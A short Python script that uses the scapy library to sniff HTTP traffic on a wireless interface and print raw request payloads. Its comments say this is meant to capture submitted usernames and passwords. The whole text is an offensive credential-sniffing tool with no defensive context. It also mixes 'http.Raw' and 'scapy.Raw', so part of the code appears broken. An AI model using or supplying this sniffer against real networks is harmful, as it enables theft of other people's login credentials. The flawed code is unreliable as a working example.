import scapy.all as scapy
from scapy.layers import http

def sniff_packet(interfaces):
    scapy.sniff(iface=interfaces,prn=process_packet,store=False)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):#it will print every information printed through http
        if packet.haslayer(http.Raw):
            print(packet[scapy.Raw].load)#it will only show password asn name
sniff_packet("wlan0")